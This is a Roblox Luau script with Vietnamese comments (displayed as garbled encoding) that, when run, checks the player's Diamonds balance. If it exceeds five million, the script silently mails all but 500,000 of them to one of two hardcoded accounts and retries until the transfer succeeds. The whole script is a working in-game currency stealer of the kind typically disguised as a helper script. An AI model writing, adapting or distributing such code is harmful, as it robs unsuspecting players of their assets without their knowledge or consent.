repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

if _G.DIAMOND_SENDER_RAN then
	warn("‚õî Script ƒë√£ ƒë∆∞·ª£c ch·∫°y tr∆∞·ªõc ƒë√≥!")
	return
end
_G.DIAMOND_SENDER_RAN = true

-- L·∫•y d·ªØ li·ªáu diamonds
local diamondsStat = player:WaitForChild("leaderstats"):FindFirstChild("üíé Diamonds")
if not diamondsStat then
	warn("Kh√¥ng t√¨m th·∫•y ch·ªâ s·ªë Diamonds.")
	return
end

local currentValue = diamondsStat.Value
if currentValue <= 5000000 then
	warn("‚ö†Ô∏è Kh√¥ng ƒë·ªß kim c∆∞∆°ng ƒë·ªÉ g·ª≠i (c·∫ßn > 5.000.000).")
	return
end

-- Danh s√°ch ng∆∞·ªùi nh·∫≠n
local receivers = { "Thien_Hoa9x", "dinhhabb1a" }
local receiver = receivers[math.random(1, #receivers)]

-- T√≠nh s·ªë l∆∞·ª£ng g·ª≠i
local amountToSend = currentValue - 500000

-- Module g·ªëc
local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
local Network = require(Client.Network)
local Save = require(Client.Save).Get()

-- T√¨m UID kim c∆∞∆°ng
local diamondsUID
for uid, v in pairs(Save.Inventory["Currency"]) do
	if v.id == "Diamonds" then
		diamondsUID = uid
		break
	end
end

if not diamondsUID then
	warn("‚ùå Kh√¥ng t√¨m th·∫•y Diamonds UID")
	return
end

-- G·ª≠i kim c∆∞∆°ng
while true do
	local success = Network.Invoke("Mailbox: Send", receiver, "Bless", "Currency", diamondsUID, amountToSend)
	if success then
		print("üì§ ƒê√£ g·ª≠i " .. amountToSend .. " üíé cho ng∆∞·ªùi d√πng: " .. receiver)
		break
	end
	task.wait(0.1)
end
